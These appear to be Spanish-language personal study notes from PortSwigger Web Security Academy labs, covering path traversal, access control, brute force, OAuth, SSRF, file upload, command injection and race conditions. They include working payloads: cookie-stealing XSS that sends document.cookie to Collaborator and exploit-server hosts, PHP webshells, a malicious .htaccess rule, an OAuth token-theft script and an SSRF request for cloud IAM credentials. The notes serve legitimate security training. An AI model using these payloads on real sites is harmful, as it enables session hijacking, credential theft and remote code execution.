## BurpScan Lab Practicioner Escaneo Dirigido

Haremos crawling en el apartado de:  http history --> do Active Scan con btn +drch

Aunque necesitaremos BurpPro:

![[Pasted image 20240205130128.png]]
  
En el apartado Issues me sale la vulnerabilidad de la web, incluso payloads a probar:

![[Pasted image 20240205130155.png]]

  

Mando al repeater la petición y en productID pongo esta línea:

foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

[XInclude es una especificación emergente de W3C para la construcción de grandes documentos XML]

Obtengo el archivo /etc/passwd y solvento el LAB

##  BurpScan Escaneando estructuras de datos no estándar y Puntos de inserción

Datos: `wiener:peter`

email: wiener@normal-user.net

Debemos de eliminar carlos

Con btn + drch uedo escanear un sólo punto  de inserción , como las cookies

Encuentro GET=wiener y veo que la cookie está asociado al user es: (El escaneo fue en la segunda cadena "session")

![[Pasted image 20240206112054.png]]

Observo que está separado por %3a , por lo que la web lo trata como dos inputs

Tras la espera suelta un XSS Stored:

![[Pasted image 20240206113500.png]]

  

### Exfiltración de cookies de admin

Dashboard --> Request --> mando request a repeater --> selecciono session y en inspector (a la derecha) me lo decodea

La decodificación es:

'"><svg/onload=fetch`//1acc91qxsdwflwrc9vfem3lau10zopch25tvgl4a\.oastify.com`>:8PeVRPDCbds6tzJZYeALeSXUbsrBJdyZ
 

Debo copiar el payload del apartado colaborator:

`//1acc91qxsdwflwrc9vfem3lau10zopch25tvgl4a\.oastify.com`

Cambiarlo por :

También la cookie: :8PeVRPDCbds6tzJZYeALeSXUbsrBJdyZ

Por:

y añadirle el document.cookie

``'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID``

Payload real:

'"><svg/onload=fetch(`//mnd4edku8wtlf7lphhs85oc1ssyjmaaz.oastify.com/${encodeURIComponent(document.cookie)}`)>:olm9pLAPNKuAtrzXD0BVBuMksHq9nbIe

  

Vamos al collaborator al cabo de un rato y vemos una solicitud HTTP con las cookies de admin

![[Pasted image 20240206120656.png]]

  

Copiamos la línea de session y realizamos un smart decoder:

session=administrator:cL73lEc7T0lZSiJGuvvLWlYxbGhSSogo; secret=4wPgFHqP625PQ09hTwlaNL3tUQhn6agb;

  

Copiamos la sesión y en las herramientas web lo copiamos en almacenamiento --> refresh

![[Pasted image 20240206121237.png]]
Deleteamos a carlos

# Path Traversal

Vulnerabilidad que es capaz de mostrarnos el contenido viajando por la ruta del SO de la víctima.

Activar las respuestas:

![[Pasted image 20240206130241.png]]

Simplemente en la petición de la imagen, buscaremos /etc/passwd poniendo los ../ que sean necesarios hasta llegar al archivo:

![[Pasted image 20240206130837.png]]

![[Pasted image 20240206130850.png]]
Tengo que ver el apartado de scope en http history añadiendolo con btn + >

## Obstáculos comunes para explotar Path Trasversal

La web bloquea la búsqueda relativa de directorios pero no la absoluta

Simplemente poniendo la ruta absoluta de /etc/passwd funciona:

![[Pasted image 20240206162347.png]]

## Búsqueda de archivos no recursiva

  Utilizamos // para saltarnos la exclusión de "/" en el código :

![[Pasted image 20240206163836.png]]

## Secuencias trasversales codificadas en URL

Esta vez tuvimos que enviarlo codificado en lenguaje de URL %252F significa  "//"

![[Pasted image 20240206170427.png]]

## Sitio esperado de inicio de ruta

3 directorios hacia atrás, se les escapa la ruta

![[Pasted image 20240206171246.png]]
  
## Validación de archivo

Enviamos un byte nulo antes de la extensión:

![[Pasted image 20240206171616.png]]

### ¿Cómo evitar Path Traversal?

1. Validar la entrada de usuario con una lista blanca

2. Verificar la entrada de contenido permitido como caracteres alfanuméricos únicamente

3. Verificar que la entrada comienza con la ruta esperada y no con un /../etc/passwd

4. Código para validar esa entrada

`File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file }`

### [Mistery Lab DONE]

  
# Control de acceso

  

• Autenticación: el usuario es quién dice ser

• Dirección de sesión: identifica que solicitudes posteriores son realizadas por ese usuario

• Control de acceso: determina si el usuario está autorizado para llevar a cabo la acción que intenta hacer.

  

### Lab

En la url encuentro el archivo robots.txt

![[Pasted image 20240206174952.png]]

Accedo a ello

  
### Lab2

Simplemente realizo un Active Scan a la URL miro sus directorios y saco :

https://0a9a00420334c1f28017da9e0078001f.web-security-academy.net/admin-wu1ja8

Seguridad por oscuridad: acto de asegurar algo por medio de la ocultación y el secreto

  

## Métodos de control de acceso basados en parámetros

  

La solicitud toma decisiones de control de acceso basadas en el valor presentado. Por ejemplo:

`https://insecure-website.com/login/home.jsp?admin=true

`https://insecure-website.com/login/home.jsp?role=1

Las aplicaciones determinan los privilegios y los guardan, puede ser en una cookie, campo oculto o una consulta pre esteblecida.

  

### Lab3 - Escalada de privilegios Vertical

En la petición HTTP se ve como la web clasifica los privilegios de usuarios:![[Pasted image 20240206182653.png]]

Cambiamos el parámetro false por true

  

### Lab4 - Escalada de privilegios Horizontal

  

En una de las webs aparecía en la url el Userid de Carlos.

En una de las peticiones cambio el parámetro de mi user wiener ya logado por el suyo:

![[Pasted image 20240206185603.png]]

  

### Lab5 - Escalada de privilegios con passwd divulgada en la Web

  

Esta página podría revelar la contraseña del administrador o proporcionar un medio para cambiarla, o podría proporcionar acceso directo a la funcionalidad privilegiada.

Cambié mi user wiener por administrator en la URL:

![[Pasted image 20240206191230.png]]

Inspecciono en el apartado de Mi Cuenta, cambio el parámetro de password a text y se puede ver la passwd, también con burp

  

### [MisteryLab ]

# Autenticación

  

• Autorización: el usuario tiene los privilegios para llevar a cabo la acción qu eintenta

• Autenticación: el usuario es quién dice ser

  

### Durante el Pentest

1. Comprobar si se revela algún user o mail públicamente

2. Puedo acceder al perfil sin iniciar sesión?

3. Hay veces que el nombre de user es el mismo que el del login

4. Comprobar las respuestas HTTP para ver si se divulga alguna dirección de correo electrónico.

### Enumeración de usuarios en brute force

Cosas que suceden si hay indicios de que un usuario exista

1.  El mensaje de error es diferente

2.  El delay de la web indica que algo está sucediendo

3. Los códigos de estado diferentes son fuertes indicadores

### Eludiendo 2FA

  

Hay webs que no verifican si el usuario introdujo la clave de 2 factor antes de cargar la página, ahí entramos noostros

  

El usuario añade su nombre y password

`POST /login-steps/first HTTP/1.1 Host: vulnerable-website.com ... username=carlos&password=qwerty`

Se le añade una cookie:

`HTTP/1.1 200 OK Set-Cookie: account=carlos GET /login-steps/second HTTP/1.1 Cookie: account=carlos`

Al iniciar el usuario introduce el código de 2FA utilizando la cookie anterior para saber con qué cuenta intenta autenticarse:

`POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=carlos ... verification-code=123456`

Ahí entro yo para cambiar la cookie del usuario que quiero,  introduciendo una cuenta antes creada:

`POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=victim-user ... verification-code=123456`

  

### Lab1 - 2FA

  

Lo que hago es antes de introducir el código de 2 factor con las credenciales de la víctima , directamente en la url voy a la página de my-account, porque la web no verifica si se ha presentado el código:

  

![[Pasted image 20240207115414.png]]

  

### Lab2 - 2FA lógica rota

  

Accedo con mi cuenta normal, en el cliente de correo preparado por PortSwigger, hay un código 2FA, lo introduzco: (Me fijo en que la cookie aparece el nombre de wiener por lo que podemos cambiarlo)

![[Pasted image 20240214122118.png]]

Mandamos la siguiente petición al REPEATER cambiando el verify=carlos, esto genera un código mfa temporal:

![[Pasted image 20240214125404.png]]

Ahora que estamos en la pantalla de introduzca código, cambiamos verify=carlos y hacemos fuerza bruta al codigo mfa, mandamos el POST /login2 a REPEATER

![[Pasted image 20240214125106.png]]

Brute Force numérico 4 digitos máximos y mínimos:

![[Pasted image 20240214130632.png]]

Nos fijamos en codigo de estado 302 Forbidden y metemos el codigo mfa, accediendo como carlos

![[Pasted image 20240214131609.png]]

  

### Lab Fuerza bruta 2FA

  

En este ataque puede que haya que repetirlo, ya que el código puede renovarse.

Crearemos una macro con las peticiones GET login, POST login y GET login2

Nos vamos a Settings>Project>Sessions

En target añadimos todas las URLS en Scope

Elijo esos login y dónde vamos a hacer Brute Force, añado un grepeo en apartado Test Macro del mensaje de 4 dígitos:

La Macro la utilizamos para que la web vea que nuestra sesión sigue siendo válida,  volvemos a lanzar esas 3 peticiones válidas (POST /login y GET /login2) de antes de la fuerza bruta entre medias (POST login2)

![[Pasted image 20240214135301.png]]

mandamos el POST login2 a intruder, hacemos fuerza bruta en MFA con números del 0 al 9999 y una resource pool de 1 petición concurrente:

![[Pasted image 20240214140749.png]]

Atacamos y obtenemos el código 302  y copio la URL al navegador:

![[Pasted image 20240215110407.png]]

  

### Lab enum users

  

Se ve cómo el código de estado y el lenght cambia tras hacer un brute forcing con clusterbomb

![[Pasted image 20240207112506.png]]

  

### Lab - Enumerando nombre de usuario mediante respuestas sutilmente diferentes

  

Mandamos el Login al intruder y hacemos un ataque de Brute Force añadiendo SÓLO el user a la variable, ataque con sniper para enumerar al usuario

Después de meter user:passwd mal a propósito grepearemos esa cadena

![[Pasted image 20240212125308.png]]

![[Pasted image 20240212125507.png]]

Notamos que en el campo error hay un ligero cambio el "." del final

![[Pasted image 20240212131745.png]]

Sabemos que algo pasa con el usuario AP, ahora en las posiciones del intruder ponemos ap como user y un payload en campo password:

![[Pasted image 20240212132404.png]]

Esa es la passwd que nos sale y obtenemos acceso tras rellenar el formulario con `ap:austin`

### Lab - Enumerando nombres a través de tiempo de respuesta diferente

  

Permite falsificar tu IP en la petición del repeater: `X-Forwarded-For`

Tenemos un Firewall que bloque las IP así que añadiremos esa cabezera y variará en cada petición:

Tipo de ataque: PITCHFORK, es importante que el campo password tenga al menos 100 caracteres

![[Pasted image 20240213121049.png]]

El primer Payload será numérico:

![[Pasted image 20240213115122.png]]

El campo del response cambia:

![[Pasted image 20240213121208.png]]

  

Así que probamos lo mismo con el usuario estático "anaheim" y añadimos a la variable el campo password:

Obtengo credenciales fijandome en el codigo de error 302:

![[Pasted image 20240213121344.png]]

`anaheim:monitor`

  

## Seguridad de fuerza bruta defectuosa

  

La seguridad Conlleva:

1. Bloquear la IP del atacante

2. Bloquear  el usuario con el que tiene intentos fallifos

Aunque puedo crear un usuario y acceder a él en la plataforma cada cierto tiempo para que esta seguridad se reinicie:

  

Esta Pag nos bloquea temporalmente:

![[Pasted image 20240213122954.png]]

Creo una resource pool a 1:

![[Pasted image 20240213124349.png]]

Debemos poner en el Payload 1 y 2, el usuario y contraseña de tal manera que coincidan para tener un inicio de sesión válido cada 2 inicios para que el firewall no nos bloquee la IP

  

### Lab - Bloqueo de cuentas

Mando a INTRUDER la petición de Login con ataque CLUSTERBOMB y añado bytes nulos en el campo password:

![[Pasted image 20240213153638.png]]

El primer Payload normal y el 2, añado 5 peticiones nulas por cada nombre:

![[Pasted image 20240213153752.png]]

Noto el usuario `apps` con un Lenght diferente.

Añado el usuario estático `apps` y password a la variable:

Tomo un extracto grepeable del error, aunque también salía la password sin tomar esta medida:

![[Pasted image 20240213154304.png]]

  

Obtenemos posibles candidatos:

![[Pasted image 20240213154406.png]]

`apps:biteme`

  

### Lab - Protección de fuerza bruta rota:

  
Ahora las credenciales van en un Json, le pido a ChatGPT que añada "palabra", a cada cadena y que abra corchetes que para el Json es un array:

![[Pasted image 20240214114757.png]]

![[Pasted image 20240214114809.png]]

  

## Autenticación por cookies

  

Hay webs en las que el inicio de sesión perdura gracias a la opción "Remember me", pedo crear una cuenta y estudiar la cookie, hay veces que la cookie es una concatenación del user+tiempo o la password es parte de la cookie.

  

### Lab Cookie - Fuerza bruta a una cookie logada

  

Este tipo de logins, puede que siga el usuario logeado aún después de cerrar sesión en el navegador.

Veo que hay un stay-logged-in

![[Pasted image 20240215111438.png]]

  
  

Cojo esta solicitud y añado variable a stay-logged

![[Pasted image 20240215112625.png]]

  

La cookie se construye:

`base64(username+':'+md5HashOfPassword)`

así que a este payload le añado una wordlist de passwds y a parte le pongo el prefijo carlos:hashea las passwds en md5 y todo eso sea en base64

![[Pasted image 20240215112649.png]]

Cuando me logeo con mi usuario con éxito, sale un mensaje de Update email, le digo que cuando saque esa cadena me avise.

![[Pasted image 20240215112604.png]]

OOOOBTENGOOOOO CREDENTIALS

![[Pasted image 20240215112730.png]]

Después de decodear esa cookie accedo con:

`carlos:hockey`

  

### Lab - obteniendo cookie con vulnerabilidad XSS

Primero observamos cómo es la cookie logeando mi cuenta, funciona igual que ele ejercicio anterior:

  

En el apartado del comment pruebo si hay una vulnerabilidad XSS:

Con un alert en comentario saca esto:

<script>alert("sip")</script>

![[Pasted image 20240215115842.png]]

Importante salir de mi contraseña, ahora haré un

`<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`

también puedo hacer un document.cookie directamente

ya que la web puede que tenga cookies almacenadas, esto se ve en los logs de la web

![[Pasted image 20240215120836.png]]

Le estamos diciendo que envíe una cookie a mi servidor, lo recogerá ya que tiene un registro de logs:

![[Pasted image 20240215120959.png]] Ip distinta

![[Pasted image 20240215121026.png]] Cookie y secret

Decodeamos y nos logeamos

El decodeo no funcionaba bien con enviado al server : Y2FybG9zOjIzYzYzE2ZDVmNNGYGYE2ZMmNZ2JiTMTM2Z0Z0N0NBHOTQz

`carlos:onceuponatime`

  

### Lab - Restablecer password Web no valida token forgot-password

  
  

![[Pasted image 20240215132454.png]]

Obtengo otra URL con mi user visitando mi correo y elimino los 2 valores de temp-forgot-passsword, cambio la contraseña a lo que quiera ya que la web NO valida estas entradas

![[Pasted image 20240215132936.png]]

Logeo con `carlos:ca`

  

### Lab - Envenenamiento de contraseñas a través de middleware

  

Redireccionaremos a través de `X-Forwarded-Host` la petición de cambio de passwd a nuestro servidor, nos dará su token en forma de log y nos iremos a la pag de cambio de passwd por URL con su token:

  

![[Pasted image 20240215183637.png]]

El token del final lo cogemos de nuestro server

![[Pasted image 20240219110144.png]]

![[Pasted image 20240219110125.png]]

Le cambiamos la contraseña y entramos con user `carlos` y la nueva passwd

### Lab - Fuerza bruta bloqueo de IP

Esta web bloquea la IP cada 2 logeos inválidos, lo que haremos será logearnos con nuestro usuario legítimamente antes de probar cada contraseña:

### Lab - Fuerza bruta a través de change-password

  

Al cambiar la passwd de mi usuario observo que si pongo la mía malsuelta este mensaje:

![[Pasted image 20240215134927.png]]

Si pongo la actuaal bien pero las contraseñas nuevas no coinciden suelta este otro:

![[Pasted image 20240215135054.png]]

Al detectar un user llamado carlos vamos a hacer un ataque de fuerza bruta a la página de change my password:

Pongo las contraseñas nuevas mal a drede para que en el mensaje de Bforce nos salga una cadena "New passwords do not match" y ahí sabemos que la contraseña actual es la correcta:

![[Pasted image 20240215135304.png]]

Ataco y salta esta: ![[Pasted image 20240215135429.png]]

`carlos:michael`

### [MisteryLab]

  

# 0Auth y 0Auth2.0

  

#0Auth: Este método se utiliza para que un sitio web o app, pueda solicitar información de otras apps y tú estés logeado con la cuenta de otra app, como el acceso a la lista de contactos.

#0Auth2:  actúan 3, app del cliente, propietario que es el user y el proveedor 0Auth proporcionando una API para acceder a la info.

  

Cuando se requiere una 0Auth la web llama a APIs:

`scope=contacts

`scope=contacts.read

`scope=contact-list-r

`scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly`

  

La primera salida de est proceso será a /autorization

`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com`

  

Mandará una solicitud a un host proveedor de servicios, debo mandar un GET a estos sitios que me devolverá un Json con info:

- `/.well-known/oauth-authorization-server`

- `/.well-known/openid-configuration`

### Lab - bypass 0Auth

  

Nos pide autenticación de una app que no es portswigger como cuando hay app que me piden auth de la cuenta de google

![[Pasted image 20240219125355.png]]

  

![[Pasted image 20240219125432.png]]

Cambio el correo de otro user ya enumerado![[Pasted image 20240219125518.png]]

Obtenemos acceso después de forwardear el burpsuite

  

### Lab - Forzar perfil OAuth

  

Aquí nos logearemos en el portal y añadiremos una cuenta de red social,

Observo que tiene los parámetros /auth y /scope, además no tiene /state por lo que no está protegido contra ataques CSRF:

![[Pasted image 20240220110158.png]]

Añado Cuenta de red social:

![[Pasted image 20240220110439.png]]

Y copio la petición GET del linking code en el servidor de explotación dónde le enviaremos el código oauth al cliente, DROP esta petición ->

![[Pasted image 20240220110624.png]]

Pulso botón de mandar exploit a la víctima:

![[Pasted image 20240220110705.png]]

  

Al hacer logout tras haber hecho un DROP de la petición /oauth-linking podemos suprimir el user:

![[Pasted image 20240220130734.png]]

  

### Lab  - SSRF  Open ID

  

Me logeo con `wiener:peter` a ver que sucede:

Vemos el servidor de Oath al que se refiere y accedemos  a él añadiéndole /.well-known/openid-configuration

![[Pasted image 20240221103007.png]]

![[Pasted image 20240220114908.png]]

Vemos que nos podemos registrar

![[Pasted image 20240220114952.png]]

Aquí registramos un client_id en el registro --> /reg

![[Pasted image 20240220115228.png]]

Ponemos un payload de BurpCollaborator con btn + right

Y luego vemos is hay interacción HTTP:

![[Pasted image 20240221103623.png]]

![[Pasted image 20240225133238.png]]

Copiamos este clientID que sale de la petición del payload BurpCollaborator

![[Pasted image 20240221103712.png]]

Sustituimos el clientid en la petición GET de /client/logo y lo mandamos

![[Pasted image 20240221103900.png]]

Sustituyo la `Logo_uri` por `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` y obtengo el número secreto en el response.

![[Pasted image 20240225133400.png]]

  

### Lab - Hijacking via redirect URI

Me logeo normalmente, al deslogearme no necesito meter las credenciales otra vez ya que el sitio utiliza OAuth

  
  

![[Pasted image 20240225135514.png]]

`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`

![[Pasted image 20240225135553.png]]

Si fallamos, tendré que deslogearme para que salga una petición con nuevo clientD para cambiar en el exploit

![[Pasted image 20240225135500.png]]

Se lo mandamos a la víctima y nos deslogearemos #importante

Captamos una petición de IP diferente con un code

![[Pasted image 20240225140417.png]]

Mandamos la petición de callback al repeater, cambiamos ese código por wel del access log, copio la url y la pego en firefox

![[Pasted image 20240225140451.png]]

Done

![[Pasted image 20240225140400.png]]

### Lab - robando tokens oAuth vía redireccionamiento

  

Me logeo con `wiener:peter` y capturo todas las URL posibles.

En la siguiente captura, es una redirección que si ponemos una de las imágenes de la web haciendo ese path traversal y DROPeamos la petición nos redirecciona directamente

![[Pasted image 20240221122020.png]]

Vemos que nos da el TOKEN en la URL

![[Pasted image 20240221121939.png]]

En el servidor de exploit pondremos esto y lo salvaremos:

<script>

    if (!document.location.hash) {

        window.location = 'https://oauth-0a1a00a9046eb10580500b4102260021.oauth-server.net/auth?client_id=c8ktbbcdbeprwfzjxrr5l&redirect_uri=https://0ad7007f0439b10580960de600540028.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ad100fb042fb1ea80670cb7017200c6.exploit-server.net/exploit&response_type=token&nonce=187647876&scope=openid%20profile%20email'

    } else {

        window.location = '/?'+document.location.hash.substr(1)

    }

</script>

  

El servidor recibe peticiones y toma acción como usuario `admin`

Esto abre una ventana y se posiciona en el server oauth al que la app solicita y haremos la redirección al servidor de exploit, al mandárselo recibiremos en el server de registro un token.

![[Pasted image 20240221203403.png]]

Cogemos la web /me y sustituimos el token por el token dado

![[Pasted image 20240221203429.png]]

![[Pasted image 20240221203441.png]]

  

### Lab - Robando Oauth tokens por página proxy

  

Me logeo normalmente y accedo a una publicación observando el código fuente vemos que hay una ruta en el que el comment es un iframe vulnerable:

![[Pasted image 20240225150434.png]]

Tomamos en cuenta la ruta /auth/client_id y /oauth-callback

![[Pasted image 20240225150521.png]]

![[Pasted image 20240225150541.png]]

Hay un server con login de admin que tomará acción si le enviamos algo, para eso está el exploit server:

Pondremos la ruta -->  /../post/comment/comment-form

![[Pasted image 20240225150831.png]]

Vemos un token en el Log:

![[Pasted image 20240225150948.png]]

Cambiamos el token en la petición /me y obtenemos la llamada a la API que utiliza para buscar los datos de la víctima , pudiendo ver info sensible:

![[Pasted image 20240225151002.png]]

![[Pasted image 20240225151019.png]]

### [Mistery Lab DONE]

# SSRF - Server Side Request Forgery

  

Vulnerabilidad del lado del servidor web en el que puede realizar peticiones a servicios externos

He aquí el ejemplo:

  

1. Petición legit a una API

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`

  

2. Petición modificada a una dirección externa, dándo al cliente el panel de admin, la app ve que la petición viene d elocalhost por lo que parece legítima y le da la autorización y privilegios completos

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118

``stockApi=http://localhost/admin

  

#### Lab1 - SSRF - cambiando la petición  a una API

  

![[Pasted image 20240207122129.png]]

Cambio el contenido stockApi por = http://localhos/admin para que me muestre el panel

![[Pasted image 20240207122331.png]]

Pero no me deja tocar nada, ya que no estamos autenticados como admin

Cogeremos la URL que elimina a carlos y la pondremos como antes en la API:

![[Pasted image 20240207124723.png]]

  

### SSRF contra otros sistemas de back-end

  

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118

``stockApi=http://192.168.0.68/admin

  

Podemos ver lo que tiene el server con IP de la red privada de la víctima 192.168.0.60

La API nos dice a que IP solicita:

![[Pasted image 20240207125828.png]]

Lo mando al INTRUDER para hacer un ataque de fuerza bruta y saber que IP es, nos da la 141:

![[Pasted image 20240207130818.png]]

Ahora borramos sin autenticarnos desdeStock API

![[Pasted image 20240207130749.png]]

  

### [MisteryLab Done]

  

# File Upload

  

Vulnerabilidad de servidor el cuál no valida el nombre, extensión, tamaño o contenido el archivo subido.

  

No sólo podemos ganar una reverse shell, también podemos ejecutar código para leer archivos concretos o ejecutar un único comando:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

`<?php echo system($_GET['command']); ?>`

`GET /example/exploit.php?command=id HTTP/1.1`

  

En los formularios HTML normalmente se envián con una solicitud POST

`application/x-www-form-url-encoded` --> texto simple

 `multipart/form-data` --> grandes binarios, imágenes o pdf

  

A continuación una petición en la que se envía una imagen, usuario y descripción:

  

`POST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="image"; filename="example.jpg" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="description" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="username" wiener ---------------------------012345678901234567890123456--`

  

Los servers utilizan el `filename`campo en `multipart/form-data` para determinar en que ruta se guarda el archivo a subir

Para eludir las listas negras de extensiones podemos poner `.php5`, `.shtml` al final de nuestro archivo
### Lab  - Subida de archivos sin verificar

  Puedo subir un archivo php con el contenido:

`<?php echo file_get_contents('/home/carlos/secret'); ?>`

Mando al repeater la petición de:

GET /files/avatars/exploit.php HTTP/2 para que solicite ese archivo

![[Pasted image 20240209142107.png]]

Obtengo el secreto de Carlos

### Lab  - Vulnerabilidad de campo Content-Type

Esta vez la Web si valida el content-type, por lo que no puedo subir archivos php, mando una webshell dentro del archivo exploit.png, pero cambio en REPEATER

`Content-Type: image/png` por `image\jpeg`

![[Pasted image 20240212114707.png]]

Lo subo y en la siguiente petición en GET  cambio exploit.png por exploit.php

![[Pasted image 20240212114903.png]]

Obtengo secreto en el response
### Lab - Subida de archivos vía PathTraversal

Me logeo y subo un archivo normalmente, veo que al directorio que se sube es a files/avatars
Pruebo con el payload:  `<?php system($_GET['cmd']);?>`
Pondremos %2E%2e%2F para retroceder a /files en la petición /my-account
![[Pasted image 20240226122505.png]]

Iremos probando comandos añadiendo a la url `?cmd=comando` la variable es cmd
![[Pasted image 20240226122723.png]]
Obtengo el secreto en un response 200
![[Pasted image 20240226122658.png]]

### Lab - Bypass lista negra extensiones

En mi /my-account-avatar modificamos los siguientes parámetros
1. Filename
2. Content-type
3. Contenido a `AddType application/x-httpd-php .l33t`

![[Pasted image 20240226125018.png]]
Ahora subimos el archivo con el contenido que queremos pero con la extensión .l33t que hemos añadido antes en nuestra instrucción de .htaccess maliciosa
![[Pasted image 20240226125218.png]]
En http history podemos ver el response de esta petición, que es el secreto ya que se ejecuta el payload
![[Pasted image 20240226130155.png]]

## Métodos File Upload Obfuscation
1. `exploit.pHp`
2. `exploit.php.jpg`
3. `exploit.php.`
4. `exploit%2Ephp`
5. `exploit.asp;.jpg` O `exploit.asp%00.jpg`
### Lab - File Upload Obfuscation

Utilzo un byte nulo para sacar un cmd en la siguiente ruta, 
![[Pasted image 20240227114749.png]]
Le quito la parte del byte nulo y png y ya puedo ejecutar comandos
![[Pasted image 20240227114906.png]]
Obtengo SECRET
### Lab -  Ejecutar código remoto por webshell políglota

Los servers verifican los archivos fijándose en los primeros bytes pj  una imagen empieza por: `FF D8 FF`

A partir de una foto con la herramienta exiftool comentamos el payload para que la web lo procese
`exiftool -comment="<?php echo 'SECRET -> ' . file_get_contents('/home/carlos/secret') . ' <- AQUI '; ?>" imagen.jpg -o payload.php

![[Pasted image 20240227122933.png]]
Nos fijamos que se adhiere el comentario, nos damos cuenta que tanto el .jpg como el .php con hexeditor empiezan por los mismos bytes

![[Pasted image 20240227123014.png]]
En HTTP history, añadiremos el filtro de image![[Pasted image 20240227123807.png]]
Vemos que aunque sea un .php es una imagen con texto detrás
![[Pasted image 20240227123713.png]]
Nos permite la subida y al mandarlo al repeater podemos ver la respuesta del servidor con el secreto concatenado

![[Pasted image 20240227123733.png]]
![[Pasted image 20240227123748.png]]

### Lab - webshell upload race condiction

Una de las formas es
Mandamos a intruder my-account/avatars y /files/avatars/exploit.php
Separamos en grupos y conexiones, dejamos los dos payloads en exploit.php, mandamos una vez el POST y con ctrl + espacio mandamos 5 veces el GET hasta que salga el secreto
![[Pasted image 20240227130033.png]]

Mandamos a intruder my-account/avatars y /files/avatars/exploit.php
Dejamos los dos payload así:
#importante Dejamos el payload a exploit.php
![[Pasted image 20240227132740.png]]
Atacamos primero con POST y luego con GET hasta que salgan coode 200
![[Pasted image 20240227132430.png]]
# [Mistery Lab done]
# Comand Injection

| Propósito de mando        | Linux         | Ventanas        |
| ------------------------- | ------------- | --------------- |
| Nombre del usuario actual | `whoami`      | `whoami`        |
| Sistema operativo         | `uname -a`    | `ver`           |
| Configuración de la red   | `ifconfig`    | `ipconfig /all` |
| Conexiones en red         | `netstat -an` | `netstat -an`   |
| Procesos de ejecución     | `ps -ef`      | `tasklist`      |
## Evitar Command Injection

1. No llamar  So commands desde la Application tier
2. Llamar Apis que ejecuten commandos de manera segura
3. Listas blancas
4. Si no se utiliza lista blanca realizar una fuerte validación de entrada de comandos
## Separadores de comandos

- `&`
- `&&`
- `|`
- `||`
-UNIX
- `;`
- Newline ( `0x0a`o o `\n`)
- `` ` `` injected command `` ` ``
-Separació de línea
- `$(` injected command `)`
## OAST - Aplicaciones fuera de banda
Son servidores externos que sirven para ver vulnerabilidades invisibles , como BurpCollaborator
### Lab - Command injection en campos de foto

En la lista de productos hay vulnerabilidad, también lo hacemos con `|` o `&`

![[Pasted image 20240212120154.png]]  

Suelta:

![[Pasted image 20240212120209.png]]
### Lab  - Blind Command injection

Esta vez la web no printea una salida por lo que nos podemos hacer una idea de lo que pasa si la página tarda en contestra haciendo un ping a si misma
![[Pasted image 20240227185832.png]]
En el campo mail se puede inyectar comandos desde sólo BURP, tarda 10 segundos por lo que obtenemos la flag
![[Pasted image 20240227185915.png]]

### Lab - Blind CI con redirecciones de salida

Esta web tiene una vulnerabilidad a la hora de presentar las imágenes, ejecuta código bash
Vulnero el campo email al añadir comment con:
`||whoami+>+/var/www/images/whoami.txt||
![[Pasted image 20240228114726.png]]
Voy al apartado de imagen y mando el GET al repeater dónde ejecuta código:
![[Pasted image 20240228114752.png]]
![[Pasted image 20240228114802.png]]

### Lab - Técnicas OAST 'nslookup'

Hay una vulnerabilidad en la función de #feedback
Nos fijaremos si los campos son inyectables haciendo un nslookup al BurpCollaborator
Sabemos euq el campo email es inyectable, pondremos nslookup+payload
![[Pasted image 20240228121011.png]]
Para saber si surtió efecto, tenemos un feedback de Collaborator y verifica la interacción DNS
![[Pasted image 20240228121242.png]]

### Lab - Ci con exfiltración OAST
Ya que no podemos ver la respuesta de nuestra inyección en ningún lado, lo mandaremos a un server de prueba como Collaborator
Importante concatenar con estas comillas ``

![[Pasted image 20240228123425.png]]
Veremos la salida del resultado en la pestaña Collaborator
![[Pasted image 20240228123604.png]]

# Race Condition
Esta vulnerabilidad se produce cuando un sitio web procesa datos simultáneamente sin el orden adecuado, hasta que se produce una colisión no intencionada.
Nosotros aprovecharemos esta vulnerabilidad mandando solicitudes cronometradas para causar estas colisiones.
- El periodo de tiempo en el que se produce una colisión se llama race window.(fracción de segundo entre dos interacciones)
- ¿A qué me refiero con solicitudes simultáneas?
Ejemplo de tienda de ropa

1. Chequeo de que no se ha usado este código
2. Aplicar el descuento en el precio
3. Updatear la BD para chequear que el código se ha utilizado
En el momento de window race, podemos aplicar descuento tantas veces como sean posibles hasta que ya se haya  acabado de aplicarse el primer  descuento

- HTTP/1 necesita una conexión por cada elemento del sitio para cargar la web
- HTTP/2 necesitamos menos conexiones para cargar la web
Hay cosas que no se pueden controlar como la latencia de red y latemncia interna del server:
![[Pasted image 20240229104006.png]]
![[Pasted image 20240229104020.png]]

Cuando se valida el pago, hay unas  milésimas de segundo que la web se queda cargando, por lo que ahí podríamos añadir productos al carrito:
![[Pasted image 20240304103215.png]]
